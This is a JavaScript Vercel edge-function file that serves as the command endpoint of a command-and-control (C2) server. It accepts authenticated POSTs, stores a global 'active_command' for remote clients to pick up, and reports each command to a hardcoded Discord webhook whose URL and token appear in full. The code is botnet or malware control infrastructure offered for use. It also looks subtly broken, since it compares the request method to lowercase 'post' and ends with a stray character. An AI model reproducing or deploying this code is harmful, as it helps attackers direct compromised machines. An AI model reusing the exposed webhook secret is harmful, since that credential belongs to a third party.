// api/command.js
import { update, get } from '@vercel/edge-config';

export const config = { runtime: 'edge' };

const discord_webhook_url = 'https://discord.com/api/webhooks/1516092945067933797/tI4BBfCLmWm4IgcUk9_b3WiurJM5z1FWn1uJ33HcN0RcqTmQJlqU0aIXcaDQdz7S_6Or'

export default async function handler(req) {
  try {
    // authenticate
    const auth_header = req.headers.get('authorization');
    if (!auth_header || auth_header !== `bearer ${process.env.C2_SECRET_KEY}`) {
      return new Response('unauthorized', { status: 401 });
    }
    if (req.method !== 'post') return new Response('invalid method', { status: 405 });

    const command = await req.json();

    // update the global command in edge config
    await update(process.env.EDGE_CONFIG, 'active_command', command);

    // notify discord that a new command has been issued
    const embed = {
      title: '🕹️ command issued',
      description: `\`\`\`json\n${JSON.stringify(command, null, 2)}\n\`\`\``,
      color: 3447003, // blue
      timestamp: new Date().toISOString(),
    };
    fetch(discord_webhook_url, {
      method: 'post',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ username: 'c2-commander', embeds: [embed] }),
    });

    return new Response(JSON.stringify({ message: 'global command updated', new_command: command }), {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      },
    });
  } catch (error) {
    console.error('Function error:', error);
    return new Response('An error occurred while processing the request', { status: 500 });
  }
}v
